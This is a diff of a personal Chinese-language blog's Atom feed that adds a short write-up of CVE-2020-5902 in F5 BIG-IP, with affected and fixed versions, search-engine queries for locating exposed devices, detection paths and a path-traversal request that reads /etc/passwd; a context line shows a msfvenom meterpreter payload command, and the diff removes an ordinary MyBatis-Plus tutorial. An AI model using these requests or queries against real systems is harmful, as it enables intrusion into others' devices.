@@ -1,11 +1,82 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-05T16:28:33+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-06T15:08:15+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
 &lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
   &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
 &lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
   &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
-</subtitle><entry><title type="html">HTTP请求方法</title><link href="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" rel="alternate" type="text/html" title="HTTP请求方法" /><published>2020-07-05T00:00:00+08:00</published><updated>2020-07-05T00:00:00+08:00</updated><id>http://localhost:4000/_posts/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">&lt;p&gt;[toc]&lt;/p&gt;
+</subtitle><entry><title type="html">cve-2020-5902</title><link href="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/" rel="alternate" type="text/html" title="cve-2020-5902" /><published>2020-07-06T00:00:00+08:00</published><updated>2020-07-06T00:00:00+08:00</updated><id>http://localhost:4000/_posts/cve-2020-5902</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/">&lt;p&gt;[toc]&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;code&gt;警告,用于学习,切勿做破坏,造成的后果本人概不负责&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;2020年07月03日， 360CERT监测发现 &lt;code&gt;F5&lt;/code&gt; 发布了 &lt;code&gt;F5 BIG-IP 远程代码执行&lt;/code&gt; 的风险通告，该漏洞编号为 &lt;code&gt;CVE-2020-5902&lt;/code&gt;，漏洞等级：&lt;code&gt;严重&lt;/code&gt;。&lt;/p&gt;
+
+  &lt;p&gt;未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 &lt;code&gt;F5 BIG-IP&lt;/code&gt; 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;漏洞详情&quot;&gt;漏洞详情&lt;/h1&gt;
+
+&lt;p&gt;&lt;code&gt;F5 BIG-IP&lt;/code&gt; 是美国&lt;code&gt;F5&lt;/code&gt;公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。&lt;/p&gt;
+
+&lt;p&gt;在 &lt;code&gt;F5 BIG-IP&lt;/code&gt; 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞。&lt;/p&gt;
+
+&lt;h1 id=&quot;影响版本&quot;&gt;影响版本&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;BIG-IP 15.x: 15.1.0/15.0.0&lt;/li&gt;
+  &lt;li&gt;BIG-IP 14.x: 14.1.0 ~ 14.1.2&lt;/li&gt;
+  &lt;li&gt;BIG-IP 13.x: 13.1.0 ~ 13.1.3&lt;/li&gt;
+  &lt;li&gt;BIG-IP 12.x: 12.1.0 ~ 12.1.5&lt;/li&gt;
+  &lt;li&gt;BIG-IP 11.x: 11.6.1 ~ 11.6.5&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;修复建议&quot;&gt;修复建议&lt;/h1&gt;
+
+&lt;p&gt;升级到以下版本&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;BIG-IP 15.x: 15.1.0.4&lt;/li&gt;
+  &lt;li&gt;BIG-IP 14.x: 14.1.2.6&lt;/li&gt;
+  &lt;li&gt;BIG-IP 13.x: 13.1.3.4&lt;/li&gt;
+  &lt;li&gt;BIG-IP 12.x: 12.1.5.2&lt;/li&gt;
+  &lt;li&gt;BIG-IP 11.x: 11.6.5.2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;目标搜索&quot;&gt;目标搜索&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;注：请将下面的%26替换为&amp;amp;&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;shodan&lt;/strong&gt;
+ http.favicon.hash:-335242539&lt;/p&gt;
+
+  &lt;p&gt;http.title:”BIG-IP%26reg;- Redirect”&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;fofa&lt;/strong&gt;
+ title=”BIG-IP%26reg;- Redirect”&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;censys&lt;/strong&gt;
+ 443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5&lt;/p&gt;
+
+  &lt;p&gt;443.https.get.title:”BIG-IP%26reg;- Redirect”&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;google&lt;/strong&gt;
+ inurl:”tmui/login.jsp”&lt;/p&gt;
+
+  &lt;p&gt;intitle:”BIG-IP” inurl:”tmui”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;漏洞检测&quot;&gt;漏洞检测&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp
+/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=a
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;利用&quot;&gt;利用&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP请求方法</title><link href="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" rel="alternate" type="text/html" title="HTTP请求方法" /><published>2020-07-05T00:00:00+08:00</published><updated>2020-07-05T00:00:00+08:00</updated><id>http://localhost:4000/_posts/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE。URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。&lt;/p&gt;
@@ -3434,598 +3505,4 @@ enumdesktops     #用户登录数
 &lt;p&gt;使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -b &amp;amp;#039;\x00&amp;amp;#039; -f raw
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">veu&amp;amp;spring项目开发</title><link href="http://localhost:4000/_posts/2020-06-25-veu&spring%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/" rel="alternate" type="text/html" title="veu&amp;spring项目开发" /><published>2020-06-25T00:00:00+08:00</published><updated>2020-06-25T00:00:00+08:00</updated><id>http://localhost:4000/_posts/veu&amp;spring%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-25-veu&amp;spring%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/">&lt;p&gt;[toc]&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;基础准备&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://mp.baomidou.com/guide/#%E7%89%B9%E6%80%A7&quot;&gt;mybati-plus&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;数据库配置&quot;&gt;数据库配置&lt;/h1&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `user`;
-CREATE TABLE `user` (
-  `id` bigint NOT NULL AUTO_INCREMENT,
-  `name` varchar(45) NOT NULL,
-  `age` int NOT NULL,
-  `email` varchar(45) NOT NULL,
-  `create_time` datetime DEFAULT NULL,
-  `update_time` datetime DEFAULT NULL,
-  PRIMARY KEY (`id`),
-  UNIQUE KEY `id_UNIQUE` (`id`)
-) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;一般需要在数据库添加&lt;code&gt;Create_time&lt;/code&gt;和&lt;code&gt;update_time&lt;/code&gt;字段,用于记录创建时间和修改时间,可以在操作数据库代码中添加相应代码去实现,不过可以在实体类中加上@TableField注解,再写一个handler继承MetaObjectHandler,实现&lt;code&gt;InsertFill&lt;/code&gt;和&lt;code&gt;updateFill&lt;/code&gt;方法,从而简化代码&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `product`;
-CREATE TABLE `product` (
-  `id` bigint NOT NULL,
-  `name` varchar(30) DEFAULT NULL,
-  `price` int DEFAULT '0',
-  `version` int DEFAULT '0' COMMENT '乐观锁',
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;version 字段 在后续解决同时操作数据库发生冲突,需在其实体类对于的数据上添加@version注解&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;applicationproperties配置&quot;&gt;application.properties配置&lt;/h1&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-properties&quot;&gt;spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
-spring.datasource.url=jdbc:mysql://localhost:3306/mybatis_plus?serverTimezone=GMT%2B8
-spring.datasource.username=name
-spring.datasource.password=pass
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;实体类&quot;&gt;实体类&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;创建entity package&lt;/li&gt;
-  &lt;li&gt;创建User.class&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.entity;
-
-import com.baomidou.mybatisplus.annotation.FieldFill;
-import com.baomidou.mybatisplus.annotation.IdType;
-import com.baomidou.mybatisplus.annotation.TableField;
-import com.baomidou.mybatisplus.annotation.TableId;
-import lombok.Data;
-
-import java.util.Date;
-
-@Data
-public class User {
-    @TableId(type =  IdType.AUTO)
-    private  long id;
-    private  String name;
-    private  Integer age;
-    private  String email;
-
-    @TableField(fill = FieldFill.INSERT)
-    private Date create_time;
-
-    @TableField(fill = FieldFill.INSERT_UPDATE)
-    private  Date update_time;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;ul&gt;
-    &lt;li&gt;@Data 注解:来源与&lt;code&gt;lombok&lt;/code&gt;,需要配置插件,主要功能是简化,自动生成getter和setter&lt;/li&gt;
-    &lt;li&gt;@TableId:主键注解,具体type参考官网&lt;/li&gt;
-    &lt;li&gt;@TableField:字段注解(非主键),后续创建类去继承MetaObjectHandler,实现InsertFill和updateFill等主要方法&lt;/li&gt;
-  &lt;/ul&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Product&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.entity;
-
-import com.baomidou.mybatisplus.annotation.Version;
-import lombok.Data;
-
-@Data
-public class Product {
-    private  Long id;
-    private  String name;
-    private  Integer price;
-
-    @Version
-    private  Integer version;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;@Version:乐观锁注解,为了在并发使用数据库时不产生冲突,具体参考测试数据库&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;mapper&quot;&gt;Mapper&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;创建mapper package&lt;/li&gt;
-  &lt;li&gt;在mapper下创建UserMapper&lt;code&gt;接口&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.mapper;
-
-import com.baomidou.mybatisplus.core.mapper.BaseMapper;
-import com.lazycat.mybatis_plus.entity.User;
-import org.springframework.stereotype.Repository;
-
-@Repository
-public interface UserMapper extends BaseMapper&amp;lt;User&amp;gt; {
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;主要是要继承&lt;code&gt;BaseMapper&lt;/code&gt;,泛型根据自己定义的实体类&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;ProductMapper&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.mapper;
-
-import com.baomidou.mybatisplus.core.mapper.BaseMapper;
-import com.lazycat.mybatis_plus.entity.Product;
-import org.springframework.stereotype.Repository;
-
-@Repository
-public interface ProductMapper extends BaseMapper&amp;lt;Product&amp;gt; {
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;handler&quot;&gt;Handler&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;创建Handler package&lt;/li&gt;
-  &lt;li&gt;创建MyObjectHandler&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.handler;
-
-import com.baomidou.mybatisplus.core.handlers.MetaObjectHandler;
-import org.apache.ibatis.reflection.MetaObject;
-import org.springframework.stereotype.Component;
-
-import java.util.Date;
-
-@Component
-public class MyObjectHandler implements MetaObjectHandler {
-    @Override
-    public void insertFill(MetaObject metaObject) {
-        this.setFieldValByName(&quot;create_time&quot;,new Date(),metaObject);
-        this.setFieldValByName(&quot;update_time&quot;,new Date(),metaObject);
-    }
-
-    @Override
-    public void updateFill(MetaObject metaObject) {
-        this.setFieldValByName(&quot;update_time&quot;,new Date(),metaObject);
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;主要是继承MetaObjectHandler,实现insertFill,updateFill等方法&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;测试数据库&quot;&gt;测试数据库&lt;/h1&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus;
-
-import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
-import com.lazycat.mybatis_plus.entity.Product;
-import com.lazycat.mybatis_plus.entity.User;
-import com.lazycat.mybatis_plus.mapper.ProductMapper;
-import com.lazycat.mybatis_plus.mapper.UserMapper;
-import net.minidev.json.JSONUtil;
-import org.junit.jupiter.api.Test;
-import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.boot.test.context.SpringBootTest;
-
-import java.lang.reflect.Array;
-import java.util.*;
-
-@SpringBootTest
-public class CRUDtest {
-    @Autowired
-    private UserMapper userMapper;
-    @Autowired
-    private ProductMapper productMapper;
-    @Test
-    public void test(){
-        User user = new User();
-        user.setAge(19);
-        user.setEmail(&quot;test@qq.com&quot;);
-//        user.setCreate_time(new Date());
-//        user.setCreate_time(new Date());
-//        user.setId(5);
-        user.setName(&quot;hhh&quot;);
-        //影响的行数
-        int result = userMapper.insert(user);
-        System.out.println(&quot;影响的行数&quot;+result);
-        System.out.println(&quot;id=&quot;+user.getId());
-    }
-    @Test
-    public void updateById(){
-        User user = new User();
-        user.setId(1);
-        user.setName(&quot;test1&quot;);
-        user.setAge(20);
-        int result = userMapper.updateById(user);
-        System.out.println(&quot;影响行数:&quot;+result);
-    }
-    @Test
-    //并发测试
-    public void ConcurrentUpdatetest(){
-        Product product1 = productMapper.selectById(1);
-        Product product2 = productMapper.selectById(1);
-        product1.setPrice(product1.getPrice()+50);
-        productMapper.updateById(product1);
-        product2.setPrice(product2.getPrice()-30);
-        int result = productMapper.updateById(product2);
-        if (result == 0){
-            System.out.println(&quot;pro2更新失败&quot;);
-            System.out.println(&quot;pro2重新更新&quot;);
-            product2 = productMapper.selectById(1);
-            product2.setPrice(product2.getPrice() - 30);
-            productMapper.updateById(product2);
-        }
-        Product product3 = productMapper.selectById(1);
-        System.out.println(product3.getPrice()
-        );
-    }
-    @Test
-    public  void BatchSelectTest(){
-        List&amp;lt;User&amp;gt; users = userMapper.selectBatchIds(Arrays.asList(-1, 2, 3));
-        users.forEach(System.out::println);
-    }
-    @Test
-    public void SelectByMap(){
-        HashMap&amp;lt;String,Object&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
-        map.put(&quot;email&quot;,&quot;test@qq.com&quot;);
-        List&amp;lt;User&amp;gt; users = userMapper.selectByMap(map);
-        users.forEach(System.out::println);
-    }
-    @Test
-    public  void SelectPage(){
-        Page&amp;lt;User&amp;gt; pages = new Page&amp;lt;&amp;gt;(1,2);
-        Page&amp;lt;User&amp;gt; userPage = userMapper.selectPage(pages,null);
-        List&amp;lt;User&amp;gt; records = userPage.getRecords();
-        records.forEach(System.out::println);
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;配置package&quot;&gt;配置package&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;创建config配置package&lt;/li&gt;
-  &lt;li&gt;创建MyBatisPlusConfig&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.config;
-
-import com.baomidou.mybatisplus.extension.plugins.OptimisticLockerInterceptor;
-import org.mybatis.spring.annotation.MapperScan;
-import org.springframework.context.annotation.Bean;
-import org.springframework.context.annotation.Configuration;
-import org.springframework.transaction.annotation.EnableTransactionManagement;
-
-@EnableTransactionManagement
-@Configuration
-@MapperScan(&quot;com.lazycat.mybatis_plus.mapper&quot;)
-public class MyBatisPlusConfig {
-    /*
-        乐观锁
-    * */
-    @Bean
-    public OptimisticLockerInterceptor optimisticLockerInterceptor() {
-        return new OptimisticLockerInterceptor();
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;分页&quot;&gt;分页&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;在config package 下编辑MyBatisPlusConfig&lt;/li&gt;
-  &lt;li&gt;添加如下插件&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.config;
-
-import com.baomidou.mybatisplus.extension.plugins.OptimisticLockerInterceptor;
-import org.mybatis.spring.annotation.MapperScan;
-import org.springframework.context.annotation.Bean;
-import org.springframework.context.annotation.Configuration;
-import org.springframework.transaction.annotation.EnableTransactionManagement;
-
-@EnableTransactionManagement
-@Configuration
-@MapperScan(&quot;com.lazycat.mybatis_plus.mapper&quot;)
-public class MyBatisPlusConfig {
-    /*
-     乐观锁
-    * */
-    @Bean
-    public OptimisticLockerInterceptor optimisticLockerInterceptor() {
-        return new OptimisticLockerInterceptor();
-    }
-    /*
-    分页插件
-    * */
-    @Bean
-    public PaginationInterceptor paginationInterceptor() {
-        PaginationInterceptor paginationInterceptor = new PaginationInterceptor();
-        // 设置请求的页面大于最大页后操作， true调回到首页，false 继续请求  默认false
-        // paginationInterceptor.setOverflow(false);
-        // 设置最大单页限制数量，默认 500 条，-1 不受限制
-        // paginationInterceptor.setLimit(500);
-        // 开启 count 的 join 优化,只针对部分 left join
-        paginationInterceptor.setCountSqlParser(new JsqlParserCountOptimize(true));
-        return paginationInterceptor;
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;逻辑删除&quot;&gt;逻辑删除&lt;/h1&gt;
-
-&lt;p&gt;在user表里面添加deleted 布尔字段,默认为0&lt;/p&gt;
-
-&lt;p&gt;在实体类User里面添加如下内容:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;@TableLogic
-private  Integer deleted;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;主要是@TableLogic实现了逻辑删除&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;可在application.yml加入如下配置(为默认配置,不添加也可以)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;mybatis-plus:
-  global-config:
-    db-config:
-      logic-delete-field: flag  #全局逻辑删除字段值 3.3.0开始支持，详情看下面。
-      logic-delete-value: 1 # 逻辑已删除值(默认为 1)
-      logic-not-delete-value: 0 # 逻辑未删除值(默认为 0)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;也可以在application.properties添加如下配置&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-properties&quot;&gt;mybatis-plus.global-config.db-config.logic-delete-value=1
-mybatis-plus.global-config.db-config.logic-not-delete-value=0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;crdu&quot;&gt;CRDU&lt;/h1&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://mp.baomidou.com/guide/crud-interface.html#service-crud-%E6%8E%A5%E5%8F%A3&quot;&gt;参考&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;父项目配置&quot;&gt;父项目配置&lt;/h1&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
-&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
-         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
-    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
-    &amp;lt;parent&amp;gt;
-        &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
-        &amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
-        &amp;lt;version&amp;gt;2.3.1.RELEASE&amp;lt;/version&amp;gt;
-        &amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;
-    &amp;lt;/parent&amp;gt;
-    &amp;lt;groupId&amp;gt;com.lazycat&amp;lt;/groupId&amp;gt;
-    &amp;lt;artifactId&amp;gt;lazycat&amp;lt;/artifactId&amp;gt;
-    &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt;
-    &amp;lt;name&amp;gt;lazycat&amp;lt;/name&amp;gt;
-    &amp;lt;description&amp;gt;Demo project for Spring Boot&amp;lt;/description&amp;gt;
-
-    &amp;lt;properties&amp;gt;
-        &amp;lt;java.version&amp;gt;1.8&amp;lt;/java.version&amp;gt;
-        &amp;lt;guli.version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/guli.version&amp;gt;
-        &amp;lt;mybatis-plus.version&amp;gt;3.0.5&amp;lt;/mybatis-plus.version&amp;gt;
-        &amp;lt;velocity.version&amp;gt;2.0&amp;lt;/velocity.version&amp;gt;
-        &amp;lt;swagger.version&amp;gt;2.7.0&amp;lt;/swagger.version&amp;gt;
-        &amp;lt;aliyun.oss.version&amp;gt;2.8.3&amp;lt;/aliyun.oss.version&amp;gt;
-        &amp;lt;jodatime.version&amp;gt;2.10.1&amp;lt;/jodatime.version&amp;gt;
-        &amp;lt;poi.version&amp;gt;3.17&amp;lt;/poi.version&amp;gt;
-        &amp;lt;commons-fileupload.version&amp;gt;1.3.1&amp;lt;/commons-fileupload.version&amp;gt;
-        &amp;lt;commons-io.version&amp;gt;2.6&amp;lt;/commons-io.version&amp;gt;
-        &amp;lt;httpclient.version&amp;gt;4.5.1&amp;lt;/httpclient.version&amp;gt;
-        &amp;lt;jwt.version&amp;gt;0.7.0&amp;lt;/jwt.version&amp;gt;
-        &amp;lt;aliyun-java-sdk-core.version&amp;gt;4.3.3&amp;lt;/aliyun-java-sdk-core.version&amp;gt;
-        &amp;lt;aliyun-sdk-oss.version&amp;gt;3.1.0&amp;lt;/aliyun-sdk-oss.version&amp;gt;
-        &amp;lt;aliyun-java-sdk-vod.version&amp;gt;2.15.2&amp;lt;/aliyun-java-sdk-vod.version&amp;gt;
-        &amp;lt;aliyun-java-vod-upload.version&amp;gt;1.4.11&amp;lt;/aliyun-java-vod-upload.version&amp;gt;
-
-        &amp;lt;aliyun-sdk-vod-upload.version&amp;gt;1.4.11&amp;lt;/aliyun-sdk-vod-upload.version&amp;gt;
-
-        &amp;lt;fastjson.version&amp;gt;1.2.28&amp;lt;/fastjson.version&amp;gt;
-
-        &amp;lt;gson.version&amp;gt;2.8.2&amp;lt;/gson.version&amp;gt;
-
-        &amp;lt;json.version&amp;gt;20170516&amp;lt;/json.version&amp;gt;
-
-        &amp;lt;commons-dbutils.version&amp;gt;1.7&amp;lt;/commons-dbutils.version&amp;gt;
-
-        &amp;lt;canal.client.version&amp;gt;1.1.0&amp;lt;/canal.client.version&amp;gt;
-
-        &amp;lt;docker.image.prefix&amp;gt;zx&amp;lt;/docker.image.prefix&amp;gt;
-
-        &amp;lt;cloud-alibaba.version&amp;gt;0.2.2.RELEASE&amp;lt;/cloud-alibaba.version&amp;gt;
-
-    &amp;lt;/properties&amp;gt;
-    &amp;lt;dependencyManagement&amp;gt;
-        &amp;lt;dependencies&amp;gt;
-            &amp;lt;!--Spring Cloud--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;org.springframework.cloud&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;spring-cloud-dependencies&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;Hoxton.RELEASE&amp;lt;/version&amp;gt;
-                &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt;
-                &amp;lt;scope&amp;gt;import&amp;lt;/scope&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;org.springframework.cloud&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;spring-cloud-alibaba-dependencies&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${cloud-alibaba.version}&amp;lt;/version&amp;gt;
-                &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt;
-                &amp;lt;scope&amp;gt;import&amp;lt;/scope&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-
-            &amp;lt;!--mybatis-plus 持久层--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;com.baomidou&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;mybatis-plus-boot-starter&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${mybatis-plus.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!-- velocity 模板引擎, Mybatis Plus 代码生成器需要 --&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;org.apache.velocity&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;velocity-engine-core&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${velocity.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
